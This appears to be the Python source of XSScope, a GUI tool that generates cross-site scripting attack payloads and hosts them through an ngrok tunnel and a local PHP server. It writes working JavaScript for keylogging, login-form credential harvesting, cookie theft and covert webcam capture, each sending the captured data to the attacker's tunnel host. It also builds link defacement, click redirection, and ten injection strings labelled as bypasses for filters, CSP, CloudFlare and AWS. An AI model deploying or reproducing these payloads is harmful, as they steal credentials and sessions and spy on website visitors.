import webbrowser  # just for help to redirect to github project page
from sys import platform  # avoid error(s) on unsupported commands
import requests
import zipfile
import io
import pyperclip #to copy payloads into clipboard

import tkinter as tk
from tkinter import filedialog
from tkinter import *
from tkinter import ttk #only required for the Loading Bar
import tkinter.messagebox

#libraries for server and xss generation such as base64
from pyngrok import ngrok
import base64
import os
from multiprocessing import Process

#SETTING UP A NGROK
with open('ngrok_authtoken.txt', 'r') as authtoken:
    ngrok_authtoken = authtoken.read()
if ngrok_authtoken == "":
    print("[!] Please enter Ngrok authtoken on /ngrok_authtoken.txt")

# open a http tunnel on port 1337
tcp_server = ngrok.connect(1337, "tcp")
tcp_server = str(tcp_server[6:])

#dividing IP and PORT in output displaying in each respective Entry
tcp_server_ip = str(tcp_server[:-6])
tcp_server_port = str(tcp_server[15:])

# license
document_license = """Copyright (c) 2020 The Browser Pirates
    Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.
    The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose and noninfringement. In no event shall the authors or cypyright holders be liable for any claim, damages or other liability, whether in an action of contract, tort or otherwise, arising from, out of or in conection with the software or the use or other dealings in the software."""

#functions start here
def quit():
    tk.Tk().quit()

def documentation():
    global document_license
    tkinter.messagebox.showinfo("XSScope - Documentation & License", document_license)

def help():
    url = "https://github.com/kleiton0x00/XSScope"
    webbrowser.open(url,new=1)

#customise + design of GUI
def agent_module():
    root1 = tk.Toplevel()
    root1.title("XSScope - XSS Agent Module")
    root1.geometry('715x365')
    #root1.iconbitmap('x_logo_VYw_icon.ico')
    root1.resizable(0,0)

    xss_keylogger_var = tk.IntVar()
    xss_xhr_harvester_var = tk.IntVar()
    xss_cookie_grabber_var = tk.IntVar()
    xss_changelinks_var = tk.IntVar()
    xss_changeimages_var = tk.IntVar()
    xss_clickjacker_var = tk.IntVar()
    xss_keyloggerjs_var = tk.IntVar()
    xss_webcam_var = tk.IntVar()

    def print_help():
        network_explaination_text = """XSScope generates automatically Ngrok TCP server for port forwarding, if you want to use your custom IP/DNS and Port please take a look at this short explaination: 

-Be sure the chosen port is forwarded, you can check at 
http://canyouseeme.org

-Using NoIp sometimes will not work properly because noip service is unstable, I recommend you to use dyndns or any stable service."""
        tkinter.messagebox.showinfo("XSScope - Help (Agent Module)", network_explaination_text)

    def changelink_function():
        if xss_changelinks_var.get() == 1:
            changelinks_text.config(state="normal")
            changelinks_entry.config(state="normal")
            changelinks_entry.insert(END, 'https://github.com/kleiton0x00/XSScope/')
        elif xss_changelinks_var.get() == 0:
            changelinks_entry.delete(0, END)
            changelinks_text.config(state="disabled")
            changelinks_entry.config(state="disabled")

    def clickjack_function():
        if xss_clickjacker_var.get() == 1:
            URL_redirection_text.config(state="normal")
            URL_redirection.config(state="normal")
            URL_redirection.insert(END, 'https://github.com/kleiton0x00/XSScope/')
        elif xss_clickjacker_var.get() == 0:
            URL_redirection.delete(0, END)
            URL_redirection.config(state="disabled")
            URL_redirection_text.config(state="disabled")

    def refresh_webcam_status():
        if xss_webcam_var.get() == 1:
            xss_webcam_interval_text.configure(state="normal")
            xss_webcam_interval.config(state="normal")
            xss_webcam_interval.insert(END, '1500')
        elif xss_webcam_var.get() == 0:
            xss_webcam_interval.delete(0, END)
            xss_webcam_interval_text.configure(state="disabled")
            xss_webcam_interval.config(state="disabled")

    def image_loader():
        if xss_changeimages_var.get() == 1:
            image_URL_text.configure(state="normal")
            image_URL_loader.config(state="normal")
            image_URL_loader.insert(END, 'https://camo.githubusercontent.com/82df4cf3df6cdb68bbc636c56baad4071b1349c4/68747470733a2f2f692e696d6775722e636f6d2f725352765578332e706e67')
        elif xss_changeimages_var.get() == 0:
            image_URL_loader.delete(0, END)
            image_URL_loader.config(state="disabled")
            image_URL_text.configure(state="disabled")

    def load_server():
        global tcp_server
        tcp_server = str(ip_dns.get()) + ":" + str(port.get())

    def xss_build():
        #defining the codes which will be added based on what user entered
        loading_bar['value'] = 0
        root1.update_idletasks()

        html_file = []
        keylogger_code = """document.onkeypress = function KeyLogger(inp){
  key_pressed = String.fromCharCode(inp.which);
  new Image().src = http://""" + tcp_server + """/retriever.php?xsscope="+key_pressed;
}

"""

        xhr_harverster_code = '''username = document.forms[0].elements[0].value;
password = document.forms[0].elements[1].value;
window.setTimeout(function(){ 
var req = new XMLHttpRequest();
req.open("GET", "http://''' + tcp_server + '''/auth_retriever.php?username="+username+"&password="+password, true);
req.send();
} , 10000);

'''

        cookie_grabber_code = '''function InterceptForm() {
new Image().src = "http://''' + tcp_server + '''/cookie_grabber.php?sessionID="+document.cookie;
}       
window.addEventListener("load", InterceptForm());

'''

        changelinks_code = '''var links = document.getElementsByTagName("a");
	for (i=0; i<links.length; i++)
	{
		links[i].href = "''' + str(changelinks_entry.get()) + '''";
		links[i].innerHTML = "Links Modified by Xsscope";
	}

'''

        changeimage_code = '''document.getElementsByTagName("img")[0].src = "''' + str(image_URL_loader.get()) + '''";

'''

        clickjacker_code = '''function catchClick () {
    location.href = "''' + str(URL_redirection.get()) + '''";
}   
document.body.addEventListener('click', catchClick, true);

'''

        webcam_code = """
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'http://""" + tcp_server + """/webcam.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, """+ str(xss_webcam_interval.get()) + """);
  
}
init();
</script>
"""

        keyloggerjs_code = """<script>
var buffer = [];
var url = 'http://""" + tcp_server + """/retriever.php?xsscope='

document.onkeypress = function(e) {
  get = window.event?event:e;
  buff = get.keyCode?get.keyCode:get.charCode;
  buff = String.fromCharCode(buff);
  buffer+=buff;
}

var imgArray = new Array();
var myVar;

function myFunction() {
  myVar = setInterval(every1sec, 1);
}

function every1sec() { 
 
     if (buffer.length > 0) {
        var data = decodeURIComponent(JSON.stringify(buffer));

        imgArray[0] = new Image();
        imgArray[0].src = url + data;

        new Image().src = buffer;
        buffer = [];
      }

}

myFunction()
</script>
"""

        #start checking every checkbox and generating payload based on the user's preference
        try:
            if xss_keylogger_var.get() == 1:
                html_file.append(keylogger_code)
            else:
                pass
            if xss_xhr_harvester_var.get() == 1:
                html_file.append(xhr_harverster_code)
            else:
                pass
            if xss_cookie_grabber_var.get() == 1:
                html_file.append(cookie_grabber_code)
            else:
                pass
            if xss_changelinks_var.get() == 1:
                html_file.append(changelinks_code)
            else:
                pass
            if xss_changeimages_var.get() == 1:
                html_file.append(changeimage_code)
            else:
                pass
            if xss_clickjacker_var.get() == 1:
                html_file.append(clickjacker_code)
            else:
                pass

            #generating xsscope.js
            jsfile = open("xsscope.js", "w")
            for script_code in html_file:
                loading_bar['value'] = 26
                root1.update_idletasks()
                jsfile.write(script_code)

            jsfile.close()
            loading_bar['value'] = 100
            root1.update_idletasks()

        except:
            loading_bar['value'] = 100
            root1.update_idletasks()

        #generating an .html payload if one of the two checkboxes is checked.
        loading_bar['value'] = 0
        root1.update_idletasks()

        html_file1 = []
        if xss_webcam_var.get() == 1 or xss_keyloggerjs_var.get() == 1:
            try:
                if xss_webcam_var.get() == 1:
                    html_file1.append(webcam_code)
                else:
                    pass
                if xss_keyloggerjs_var.get() == 1:
                    html_file1.append(keyloggerjs_code)

                built_payload = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".html")
                if built_payload is None:  # asksaveasfile return `None` if dialog closed with "cancel".
                    return

                built_payload.write("<!doctype html>\n")
                built_payload.write("<html>\n")
                for script_code1 in html_file1:
                    built_payload.write(script_code1)
                built_payload.write("\n</html>")
                built_payload.close()

                loading_bar['value'] = 100
                root1.update_idletasks()

            except:
                loading_bar['value'] = 100
                root1.update_idletasks()

        loading_bar['value'] = 100
        root1.update_idletasks()
        tkinter.messagebox.showinfo("Info", "Payload successfuly built.")

    # HTML Frame Module
    root4_frame = LabelFrame(root1, text="HTML Module Frame (will export as .html)")
    root4_frame.place(x=5, y=240)

    xss_webcam = tk.Checkbutton(root4_frame, text="Persistent webcam hijacking. (requires permission) ",variable=xss_webcam_var, command=refresh_webcam_status)
    xss_webcam.grid(row=0, column=0)

    xss_webcam_interval_text = tk.Label(root4_frame, text="Capture Interval (ms): ", state="disabled")
    xss_webcam_interval_text.grid(row=0, column=1)

    xss_webcam_interval = tk.Entry(root4_frame, width=10, state="disabled")
    xss_webcam_interval.grid(row=0, column=2)

    xss_keyloggerjs = tk.Checkbutton(root4_frame, text="Keyboard spying (js active keylogger)                      ",variable=xss_keyloggerjs_var)
    xss_keyloggerjs.grid(row=1, column=0)

    #network settings frame root1_frame
    root1_frame = LabelFrame(root1, text="Network Settings")
    root1_frame.place(x=5, y=0)

    ip_dns_text = tk.Label(root1_frame, text="IP/DNS: ")
    ip_dns_text.grid(row=0, column=0)

    port_text = tk.Label(root1_frame, text="PORT: ")
    port_text.grid(row=0, column=2)

    ip_dns = tk.Entry(root1_frame, width=30)
    ip_dns.insert(END, tcp_server_ip)
    ip_dns.grid(row=0, column=1)

    port = tk.Entry(root1_frame, width=10)
    port.insert(END, tcp_server_port)
    port.grid(row=0, column=3)

    load_server_button = tk.Button(root1_frame, text="Load server", command=load_server)
    load_server_button.grid(row=0, column=4)

    help_frame = LabelFrame(root1, text="")
    help_frame.place(x=666, y=14)

    help_button = tk.Button(help_frame, text="?", command=print_help)
    help_button.grid(row=0, column=0)

    #xss module frame
    root2_frame = LabelFrame(root1, text="XSS Module Frame")
    root2_frame.place(x=5, y=55)

    xss_keylogger = tk.Checkbutton(root2_frame, text="Keyboard spying (active keylogger)                                                                                                            ", variable=xss_keylogger_var)
    xss_keylogger.grid(row=1, column=0)

    xss_xhr_harvester = tk.Checkbutton(root2_frame, text="Monitor every Entry form in the website.                                                                                                    ", variable=xss_xhr_harvester_var)
    xss_xhr_harvester.grid(row=2, column=0)

    xss_cookie_grabber = tk.Checkbutton(root2_frame, text="Grab the victim cookies (if any)                                                                                                                   ", variable=xss_cookie_grabber_var)
    xss_cookie_grabber.grid(row=3, column=0)

    #-----------xss modules frames (for fun) inside the main module frame
    root3_frame = LabelFrame(root2_frame, text="Funny Module Frame")
    root3_frame.grid(row=4, column=0)

    xss_changelinks = tk.Checkbutton(root3_frame, text="Change every link in the website.    ", variable=xss_changelinks_var, command=changelink_function)
    xss_changelinks.grid(row=0, column=0)

    changelinks_text = tk.Label(root3_frame, text=" Replaced URL: ", state="disabled")
    changelinks_text.grid(row=0, column=1)

    changelinks_entry = tk.Entry(root3_frame, width=40, state="disabled")
    changelinks_entry.grid(row=0, column=2)

    xss_changeimages = tk.Checkbutton(root3_frame, text="Change every image in the website.", variable=xss_changeimages_var, command=image_loader)
    xss_changeimages.grid(row=1, column=0)

    image_URL_text = tk.Label(root3_frame, text=" Image URL: ", state="disabled")
    image_URL_text.grid(row=1, column=1)

    image_URL_loader = tk.Entry(root3_frame, width=40, state="disabled")
    image_URL_loader.grid(row=1, column=2)

    xss_clickjacker = tk.Checkbutton(root3_frame, text="Trolling clickjacker.                           ", variable=xss_clickjacker_var, command=clickjack_function)
    xss_clickjacker.grid(row=2, column=0)

    URL_redirection_text = tk.Label(root3_frame, text=" Redirect URL: ", state="disabled")
    URL_redirection_text.grid(row=2, column=1)

    URL_redirection = tk.Entry(root3_frame, width=40, state="disabled")
    URL_redirection.grid(row=2, column=2)

    #-------Output of the loading bar and button
    root5_frame = LabelFrame(root1, text="")
    root5_frame.place(x=5, y=320)

    loading_bar = ttk.Progressbar(root5_frame, orient = HORIZONTAL, length= 555, mode = 'determinate')
    loading_bar.grid(row=0, column=0)


    build_payload_button = tk.Button(root5_frame, text="Build the payload", command=xss_build)
    build_payload_button.grid(row=0, column=1)

def check_update():
    version_file = open('version.txt', mode='r')
    old_version = float(version_file.read())
    version_file.close()

    version_request = requests.get("https://raw.githubusercontent.com/kleiton0x00/XSScope/master/version.txt")
    new_version = float(version_request.content)

    if old_version >= new_version:
        tkinter.messagebox.showinfo("Check for update", "No need to update, you are using the latest version.")
    if old_version < new_version:
        update = tkinter.messagebox.askquestion("Check for update", "There is a newer version, do you want to update?")
        if update == 'yes':
            if platform == "linux" or platform == "linux2":
                tkinter.messagebox.showinfo("Update", "The software will begin to update, please be patient.")
                os.system('cd ..')
                os.system("git clone https://github.com/kleiton0x00/XSScope.git")
                tkinter.messagebox.showinfo("Successful update", "Software successfuly updated, please restart the application.")
            if platform == "win32":
                os.system('cd ..')
                current_directory = os.getcwd()
                request = requests.get("https://github.com/kleiton0x00/XSScope/archive/master.zip")
                zip_file = zipfile.ZipFile(io.BytesIO(request.content))
                zip_file.extractall(current_directory)
                tkinter.messagebox.showinfo("Successful update", "File successfuly extracted in: " + current_directory)
                tkinter.messagebox.showinfo("Successful update", "Software successfuly updated, please restart the application.")

#functions of the main frame

def show_payload():
    root3 = tk.Toplevel()
    root3.title("XSScope v.1.2 - All XSS Payloads")
    root3.geometry('750x580')
    #root3.iconbitmap('x_logo_VYw_icon.ico')
    root3.resizable(0, 0)

    main_frame10 = LabelFrame(root3, text="")
    main_frame10.place(x=5, y=0)

    def quit3():
        tk.Toplevel().quit()

#work on this function to copy payload in clipboard
    def copy_payload1():
        pyperclip.copy(payload1)

    def copy_payload2():
        pyperclip.copy(payload2)

    def copy_payload3():
        pyperclip.copy(payload3_final)

    def copy_payload4():
        pyperclip.copy(payload4)

    def copy_payload5():
        pyperclip.copy(payload5)

    def copy_payload6():
        pyperclip.copy(payload6)

    def copy_payload7():
        pyperclip.copy(payload7)

    def copy_payload8():
        pyperclip.copy(payload8)

    def copy_payload9():
        pyperclip.copy(payload9)

    def copy_payload10():
        pyperclip.copy(payload10_final)

    #generating all XSS payloads

    payload3_script = 'var a=document.createElement("script");a.src="http://' + tcp_server + '/xsscope.js' + '";document.body.appendChild(a);'
    payload3_b64 = str(base64.b64encode(payload3_script.encode('utf-8')))
    payload3 = str(payload3_b64.split("b'")[1])
    payload3 = str(payload3[:-1])
    payload3 = str(payload3[:-2])

    cloudflare_bypass = "&Tab;" #needed for payload 8

    payload1 = '<script src="http://' + tcp_server + '/xsscope.js"></script>'

    payload10_script = str(base64.b64encode(payload1.encode('utf-8')))
    payload10 = str(payload10_script.split("b'")[1])

    payload2 = """javascript:eval('var a=document.createElement(\'script\');a.src=\'http://""" + tcp_server + """/xsscope.js\';document.body.appendChild(a)')"""
    payload3_final = '"><input onfocus=eval(atob(this.id)) id=' + payload3 + '&#61;&#61; autofocus>'
    payload4 = '"><img src=x id=' + payload3 + '&#61;&#61; onerror=eval(atob(this.id))>'
    payload5 = '"><video><source onerror=eval(atob(this.id)) id=' + payload3 + '&#61;&#61;>'
    payload6 = '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + tcp_server + '/xsscope.js");a.send();</script>'
    payload7 = '<script>$.getScript("//' + tcp_server + '/xsscope.js")</script>'
    payload8 = "<iframe src=h" + cloudflare_bypass + "t" + cloudflare_bypass + "t" + cloudflare_bypass + "p" + cloudflare_bypass + ":" + cloudflare_bypass + "/" + cloudflare_bypass + "/" + cloudflare_bypass + list(tcp_server)[0] + cloudflare_bypass + list(tcp_server)[1] + cloudflare_bypass + list(tcp_server)[2] + cloudflare_bypass + list(tcp_server)[3] + cloudflare_bypass + list(tcp_server)[4] + cloudflare_bypass + list(tcp_server)[5] + cloudflare_bypass + list(tcp_server)[6] + cloudflare_bypass + list(tcp_server)[7] + cloudflare_bypass + list(tcp_server)[8] + cloudflare_bypass + list(tcp_server)[9] + cloudflare_bypass + list(tcp_server)[10] + cloudflare_bypass + list(tcp_server)[11] + cloudflare_bypass + list(tcp_server)[12] + cloudflare_bypass + list(tcp_server)[13] + cloudflare_bypass + list(tcp_server)[14] + cloudflare_bypass + list(tcp_server)[15] + cloudflare_bypass + list(tcp_server)[16] + cloudflare_bypass + list(tcp_server)[17] + cloudflare_bypass + list(tcp_server)[18] + cloudflare_bypass + list(tcp_server)[19] + cloudflare_bypass + "/" + cloudflare_bypass + "x" + cloudflare_bypass + "s" + cloudflare_bypass + "s" + cloudflare_bypass + "c" + cloudflare_bypass + "o" + cloudflare_bypass + "p" + cloudflare_bypass + "e" + cloudflare_bypass + "." + cloudflare_bypass + "j" + cloudflare_bypass + "s" + cloudflare_bypass + "></iframe>"
    payload9 = '<!' + str(payload1)
    payload10_final = "<svg/onload=eval(atob('" + payload10 + "))>"

    #save to intruder file
    intruder_content = payload1 + "\n" + payload2 + "\n" + payload3 + "\n" + payload4 + "\n" + payload5 + "\n" + payload6 + "\n" + payload7 + "\n" + payload8 + "\n" + payload9 + "\n" + payload10_final
    def directory_save():
        intruder = tkinter.filedialog.asksaveasfile(mode='w', defaultextension=".txt")
        if intruder is None:  # asksaveasfile return `None` if dialog closed with "cancel".
            return
        intruder.write(intruder_content)
        intruder.close()

    # customising the Tab for all payloads

    introduction_text = tk.Label(main_frame10, text="The following payloads are used for bug hunting. Those are XSS payloads with a high impact.")
    introduction_text.grid(row=0, column=0)

    main_frame11 = LabelFrame(root3, text="")
    main_frame11.place(x=5, y=40)

    payload1_text = tk.Label(main_frame11, text="Basic Tag Payload: ")
    payload1_text.grid(row=0, column=0)

    payload1_entry = tk.Entry(main_frame11, width=76)
    payload1_entry.insert(END, payload1)
    payload1_entry.grid(row=1, column=0)

    copy_payload1 = tk.Button(main_frame11, text="Copy payload", command=copy_payload1) #add command
    copy_payload1.grid(row=1, column=1)

    payload2_text = tk.Label(main_frame11, text="URI Payload (Use where URI's are taken as input): ")
    payload2_text.grid(row=2, column=0)

    payload2_entry = tk.Entry(main_frame11, width=76)
    payload2_entry.insert(END, payload2)
    payload2_entry.grid(row=3, column=0)

    copy_payload2 = tk.Button(main_frame11, text="Copy payload", command=copy_payload2) #add command
    copy_payload2.grid(row=3, column=1)

    payload3_text = tk.Label(main_frame11, text="Tag Payload (Bypassing Blacklist system): ")
    payload3_text.grid(row=4, column=0)

    payload3_entry = tk.Entry(main_frame11, width=76)
    payload3_entry.insert(END, payload3_final)
    payload3_entry.grid(row=5, column=0)

    copy_payload3 = tk.Button(main_frame11, text="Copy payload", command=copy_payload3) #add command
    copy_payload3.grid(row=5, column=1)

    payload4_text = tk.Label(main_frame11, text="Tag Payload (Use when <script> tags are filtered): ")
    payload4_text.grid(row=6, column=0)

    payload4_entry = tk.Entry(main_frame11, width=76)
    payload4_entry.insert(END, payload4)
    payload4_entry.grid(row=7, column=0)

    copy_payload4 = tk.Button(main_frame11, text="Copy payload", command=copy_payload4) #add command
    copy_payload4.grid(row=7, column=1)

    payload5_text = tk.Label(main_frame11, text="Tag Payload (HTML5 payload): ")
    payload5_text.grid(row=8, column=0)

    payload5_entry = tk.Entry(main_frame11, width=76)
    payload5_entry.insert(END, payload5)
    payload5_entry.grid(row=9, column=0)

    copy_payload5 = tk.Button(main_frame11, text="Copy payload", command=copy_payload5) #add command
    copy_payload5.grid(row=9, column=1)

    payload6_text = tk.Label(main_frame11, text="Payload for exploitation of webapp with CSP: ")
    payload6_text.grid(row=10, column=0)

    payload6_entry = tk.Entry(main_frame11, width=76)
    payload6_entry.insert(END, payload6)
    payload6_entry.grid(row=11, column=0)

    copy_payload6 = tk.Button(main_frame11, text="Copy payload", command=copy_payload6) #add command
    copy_payload6.grid(row=11, column=1)

    payload7_text = tk.Label(main_frame11, text="Payload for websites that include JQuery: ")
    payload7_text.grid(row=12, column=0)

    payload7_entry = tk.Entry(main_frame11, width=76)
    payload7_entry.insert(END, payload7)
    payload7_entry.grid(row=13, column=0)

    copy_payload7 = tk.Button(main_frame11, text="Copy payload", command=copy_payload7) #add command
    copy_payload7.grid(row=13, column=1)

    payload8_text = tk.Label(main_frame11, text="Tag Payload (CloudFlare Bypassing): ")
    payload8_text.grid(row=14, column=0)

    payload8_entry = tk.Entry(main_frame11, width=76)
    payload8_entry.insert(END, payload8)
    payload8_entry.grid(row=15, column=0)

    copy_payload8 = tk.Button(main_frame11, text="Copy payload", command=copy_payload8) #add command
    copy_payload8.grid(row=15, column=1)

    payload9_text = tk.Label(main_frame11, text="Tag Payload (AWS Bypassing): ")
    payload9_text.grid(row=16, column=0)

    payload9_entry = tk.Entry(main_frame11, width=76)
    payload9_entry.insert(END, payload9)
    payload9_entry.grid(row=17, column=0)

    copy_payload9 = tk.Button(main_frame11, text="Copy payload", command=copy_payload9) #add command
    copy_payload9.grid(row=17, column=1)

    payload10_text = tk.Label(main_frame11, text="Base64-Encoded Payload: ")
    payload10_text.grid(row=18, column=0)

    payload10_entry = tk.Entry(main_frame11, width=76)
    payload10_entry.insert(END, payload10_final)
    payload10_entry.grid(row=19, column=0)

    copy_payload10 = tk.Button(main_frame11, text="Copy payload", command=copy_payload10) #add command
    copy_payload10.grid(row=19, column=1)

    menubar1 = Menu(root3)
    filemenu1 = Menu(menubar1, tearoff=0)
    filemenu1.add_command(label="Save as a directory", command=directory_save)
    #filemenu1.add_separator()
    filemenu1.add_command(label="Exit", command=quit3)
    menubar1.add_cascade(label="Main", menu=filemenu1)

    root3.config(menu=menubar1)
    root3.mainloop()

def main():
    #setting up the whole gui properties
    root = tk.Tk()
    root.title("XSScope v.1.2")
    root.geometry('410x100')
    #root.iconbitmap('x_logo_VYw_icon.ico')
    root.resizable(0,0)
    current_version = 1.2
    #end of the gui propertie
    #print the welcoming message in the terminal/cmd

    # main frames
    main_frame = LabelFrame(root, text="Ngrok Server Information")
    main_frame.place(x=5, y=0)

    # FRAME for NGROK TCP Server
    ngrok_server_text = tk.Label(main_frame, text="IP: ")
    ngrok_server_text.grid(row=0, column=0)

    ngrok_server_output = tk.Entry(main_frame, width=30)
    ngrok_server_output.insert(END, tcp_server_ip) #here you should add the NGROK ADDRESS
    ngrok_server_output.configure(state="readonly")
    ngrok_server_output.grid(row=0, column=1)

    ngrok_port_text = tk.Label(main_frame, text="Port: ")
    ngrok_port_text.grid(row=0, column=2)

    ngrok_port_output = tk.Entry(main_frame, width=10)
    ngrok_port_output.insert(END, tcp_server_port)
    ngrok_port_output.configure(state="readonly")
    ngrok_port_output.grid(row=0, column=3)

    # FRAME for PHP local Server
    main_frame1 = LabelFrame(root, text="Local PHP Server Information")
    main_frame1.place(x=5, y=50)

    php_server_text = tk.Label(main_frame1, text="IP: ")
    php_server_text.grid(row=0, column=0)

    php_server_output = tk.Entry(main_frame1, width=30)
    php_server_output.insert(END, '127.0.0.1')
    php_server_output.configure(state="readonly")
    php_server_output.grid(row=0, column=1)

    php_port_text = tk.Label(main_frame1, text="Port: ")
    php_port_text.grid(row=0, column=2)

    php_port_output = tk.Entry(main_frame1, width=10)
    php_port_output.insert(END, '1337')
    php_port_output.configure(state="readonly")
    php_port_output.grid(row=0, column=3)

    # FRAME for Listener output
    #main_frame2 = LabelFrame(root, text="Listener Output")
    #main_frame2.place(x=5, y=100)

    #listener_output = Text(main_frame2, width=90, height=19)
    #listener_output.grid(row=0, column=0)

    #customising the Menu
    menubar = Menu(root)
    filemenu = Menu(menubar, tearoff=0)
    filemenu.add_command(label="Agent Module", command=agent_module)
    filemenu.add_command(label="XSS Hunting", command=show_payload)
    filemenu.add_separator()
    filemenu.add_command(label="About", command=documentation)
    filemenu.add_command(label="Check for update", command=check_update)
    filemenu.add_command(label="Exit", command=quit)
    menubar.add_cascade(label="Main", menu=filemenu)

    # end of script to configure all the script
    root.config(menu=menubar)
    root.mainloop()

def php_server():
    os.system('php -S localhost:1337')

#starting the threads
thread_2 = Process(target=php_server)
thread_2.start()

thread_1 = Process(target=main)
thread_1.start()

#closing threads
thread_2.join()
thread_1.join()
